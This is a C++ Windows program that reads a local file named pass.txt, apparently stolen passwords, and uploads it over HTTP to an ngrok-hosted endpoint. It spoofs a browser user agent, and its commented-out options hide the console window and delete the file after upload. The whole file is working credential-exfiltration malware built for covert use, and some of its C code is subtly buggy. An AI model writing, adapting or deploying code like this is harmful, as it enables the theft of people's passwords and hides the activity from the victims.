#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <tchar.h>
#include<stdio.h>
#include<stdlib.h>
#pragma warning(disable : 4996)
#pragma comment(lib,"wininet.lib")
#define ERROR_OPEN_FILE       10
#define ERROR_MEMORY          11
#define ERROR_SIZE            12
#define ERROR_INTERNET_OPEN   13
#define ERROR_INTERNET_CONN   14
#define ERROR_INTERNET_REQ    15
#define ERROR_INTERNET_SEND   16

using namespace std;

int main()
{
	// Uncomment these Lines if You want to make console Hidden
	/*HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);*/

	//Wait for 5 Seconds then starts Uploading
	Sleep(5000);

	// Local variables
	static char *filename = "pass.txt";   //Filename to be loaded
	static char *filepath = "C:\\Temp\\pass.txt";   //Filename to be loaded
	static char *type = "text/plain";
	static char boundary[] = "---------------------------11574123911995712864259725041";            //Header boundary
	static char nameForm[] = "uploaded_file";     //Input form name
	static char iaddr[] = "b84c3629.ngrok.io";        //IP address
	static char url[] = "/post/upload.php";         //URL
	static char conn_type[] = "Connection: close";

	char hdrs[512] = { '-' };                  //Headers
	char * buffer;                   //Buffer containing file + headers
	char * content;                  //Buffer containing file
	FILE * pFile;                    //File pointer
	long lSize;                      //File size
	size_t result;

	// Open file
	pFile = fopen(filepath, "rb");
	if (pFile == NULL)
	{
		printf("ERROR_OPEN_FILE");
		getchar();
		return ERROR_OPEN_FILE;
	}
	printf("OPEN_FILE\n");

	// obtain file size:
	fseek(pFile, 0, SEEK_END);
	lSize = ftell(pFile);
	rewind(pFile);

	// allocate memory to contain the whole file:
	content = (char*)malloc(sizeof(char)*(lSize + 1));
	if (content == NULL)
	{
		printf("ERROR_MEMORY");
		getchar();
		return ERROR_OPEN_FILE;
	}
	printf("MEMORY_ALLOCATED\t \"%d\" \n", &lSize);
	// copy the file into the buffer:
	result = fread(content, 1, lSize, pFile);
	if (result != lSize)
	{
		printf("ERROR_SIZE");
		getchar();
		return ERROR_OPEN_FILE;
	}
	printf("SIZE_OK\n");

	content[lSize] = '\0';

	// terminate
	fclose(pFile);
	printf("FILE_CLOSE\n");
	//allocate memory to contain the whole file + HEADER
	buffer = (char*)malloc(sizeof(char)*lSize + 2048);

	//print header
	sprintf(hdrs, "Content-Type: multipart/form-data; boundary=%s\r\n%s", boundary, conn_type);
	sprintf(buffer, "--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n", boundary, nameForm, filename);
	sprintf(buffer, "%sContent-Type: %s\r\n", buffer, type);
	sprintf(buffer, "%s\r\n%s", buffer, content);
	sprintf(buffer, "%s\r\n\n--%s--\r\n", buffer, boundary);

	//printf("%s", buffer);

	//Open internet connection
	HINTERNET hSession = InternetOpen("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hSession == NULL)
	{
		printf("ERROR_INTERNET_OPEN");
		getchar();
		return ERROR_OPEN_FILE;
	}
	printf("INTERNET_OPENED\n");

	HINTERNET hConnect = InternetConnect(hSession, iaddr, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
	if (hConnect == NULL)
	{
		printf("ERROR_INTERNET_CONN");
		getchar();
		return ERROR_INTERNET_CONN;
	}
	printf("INTERNET_CONNECTED\n");

	HINTERNET hRequest = HttpOpenRequest(hConnect, (const char*)"POST", _T(url), NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 1);
	if (hRequest == NULL)
	{
		printf("ERROR_INTERNET_REQ");
		getchar();

	}
	printf("INTERNET_REQ_OPEN\n");

	BOOL sent = HttpSendRequest(hRequest, hdrs, strlen(hdrs), buffer, strlen(buffer));
	if (sent) {

		// If You want to Delete File after Successfull Upload  
	//	DeleteFile("C:\\Temp\\pass.txt");

		printf("INTERNET_SEND_OK\n");
		return 0;
	}

	if (!sent)
	{
		printf("ERROR_INTERNET_SEND");
		getchar();
		return ERROR_INTERNET_CONN;
	}
	


	InternetCloseHandle(hSession);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hRequest);


	return 0;
}